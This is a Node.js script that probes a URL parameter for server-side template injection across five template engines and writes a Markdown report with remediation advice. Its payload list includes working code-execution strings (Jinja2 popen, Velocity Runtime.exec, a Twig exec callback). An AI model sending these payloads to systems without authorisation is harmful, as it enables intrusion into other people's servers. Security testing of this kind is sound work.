#!/usr/bin/env node
/**
 * SSTI (Server-Side Template Injection) Tester
 * Tests for template injection vulnerabilities.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class SSTITester {
    constructor(url) {
        this.url = url;
        this.payloads = {
            jinja2: [
                '{{7*7}}',
                '{{config}}',
                '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ],
            freemarker: [
                '${7*7}',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}'
            ],
            velocity: [
                '#set($x=7*7)${x}',
                '$product.getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
            ],
            smarty: [
                '{7*7}',
                '{php}echo "test";{/php}'
            ],
            twig: [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
            ]
        };
        this.vulnerable = false;
        this.templateEngine = null;
    }

    makeRequest(url) {
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https') ? https : http;
            protocol.get(url, { timeout: 10000 }, (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    resolve({ statusCode: res.statusCode, text: data });
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
    }

    async testSSTI(param) {
        console.log(`[*] Testing SSTI in parameter: ${param}`);
        
        for (const [engine, payloads] of Object.entries(this.payloads)) {
            for (const payload of payloads) {
                try {
                    const urlObj = new URL(this.url);
                    urlObj.searchParams.set(param, payload);
                    
                    const response = await this.makeRequest(urlObj.toString());
                    
                    if (response.text.includes('49') || response.text.toLowerCase().includes('id=')) {
                        console.log(`[+] Potential SSTI found! Template engine: ${engine}`);
                        this.vulnerable = true;
                        this.templateEngine = engine;
                        return true;
                    }
                } catch (err) {
                    // Ignore errors
                }
            }
        }
        
        return false;
    }

    generateReport() {
        let report = `# SSTI Test Report for ${this.url}\n\n`;
        
        if (this.vulnerable) {
            report += `⚠️ **VULNERABLE**: SSTI vulnerability detected!\n\n`;
            report += `**Template Engine**: ${this.templateEngine}\n\n`;
        } else {
            report += `✅ No SSTI vulnerability detected.\n\n`;
        }
        
        report += `## Tested Payloads\n\n`;
        for (const [engine, payloads] of Object.entries(this.payloads)) {
            report += `### ${engine.toUpperCase()}\n\n`;
            payloads.forEach(payload => {
                report += `- \`${payload}\`\n`;
            });
            report += `\n`;
        }
        
        report += `## Recommendations\n\n`;
        report += `1. Use static templates when possible\n`;
        report += `2. Sanitize user input\n`;
        report += `3. Use sandboxed template environments\n`;
        report += `4. Disable dangerous template functions\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 4) {
        console.log('Usage: node ssti_tester.js <url> <parameter>');
        console.log('Example: node ssti_tester.js http://example.com/render template');
        process.exit(1);
    }
    
    const url = process.argv[2];
    const param = process.argv[3];
    
    const tester = new SSTITester(url);
    await tester.testSSTI(param);
    
    const report = tester.generateReport();
    
    const filename = 'ssti_test_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] SSTI testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = SSTITester;

